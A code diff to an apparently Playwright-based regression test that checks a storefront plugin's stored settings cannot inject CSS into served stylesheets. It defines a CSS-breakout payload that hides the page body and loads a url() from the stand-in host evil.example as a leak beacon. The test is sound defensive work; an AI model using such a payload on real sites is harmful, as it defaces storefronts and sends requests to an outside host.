@@ -19,9 +19,34 @@ import { PRODUCTS } from '../../data/products';
 //
 // Each case stores the payload, loads the storefront, and asserts the breakout
 // never reaches the served CSS and the page still renders.
+//
+// Assertions read the concatenated text of every <style> element rather than the
+// whole document, because the payload legitimately appears elsewhere on the page
+// in contexts that cannot escape into a stylesheet:
+//
+//   * wp_localize_script() JSON — floating-notification-bar and
+//     progressive-discount-banner dump their entire settings array into a
+//     `var spsg_fnb_data = {…}` blob. That is inert, JSON-encoded data.
+//   * esc_attr'd `style=` / `stroke=` attributes — the fly-cart and stock-bar
+//     templates render colours into element attributes. A payload there can add
+//     declarations to that one element, but cannot close the attribute or reach
+//     a selector, so it cannot deface the storefront. Tracked separately; it is
+//     a different and much smaller problem than #257.
+//
+// A stylesheet breakout, the bug this guards, can only land inside a <style>.
 
 const CANARY = 'spsg-css-injection-canary';
-const PAYLOAD = `#fff} body{display:none !important} .${CANARY}{background:url(https://evil.example/?leak=1)} .z{color:#fff`;
+const EVIL_HOST = 'evil.example';
+const PAYLOAD = `#fff} body{display:none !important} .${CANARY}{background:url(https://${EVIL_HOST}/?leak=1)} .z{color:#fff`;
+
+/** Concatenated text of every <style> element the page serves. */
+async function servedCss(page: any): Promise<string> {
+  return page.evaluate(() =>
+    Array.from(document.querySelectorAll('style'))
+      .map((el) => el.textContent || '')
+      .join('\n'),
+  );
+}
 
 type Target = {
   label: string;
@@ -144,11 +169,16 @@ test.describe('Storefront · stored settings cannot inject CSS', { tag: '@ui' },
         await t.save(page, PAYLOAD);
         await gotoProduct(page, PRODUCTS.a.slug);
 
-        const html = await page.content();
+        const css = await servedCss(page);
 
-        // The breakout rules must never reach the served stylesheet.
-        expect(html, `${t.label} leaked the injected selector into the page`).not.toContain(CANARY);
-        expect(html, `${t.label} leaked a display:none breakout into the page`).not.toContain(
+        // The breakout rules must never reach a served stylesheet.
+        expect(css, `${t.label} leaked the injected selector into a <style> block`).not.toContain(
+          CANARY,
+        );
+        expect(css, `${t.label} leaked the injected url() into a <style> block`).not.toContain(
+          EVIL_HOST,
+        );
+        expect(css, `${t.label} leaked a declaration breakout into a <style> block`).not.toContain(
           'body{display:none',
         );
 
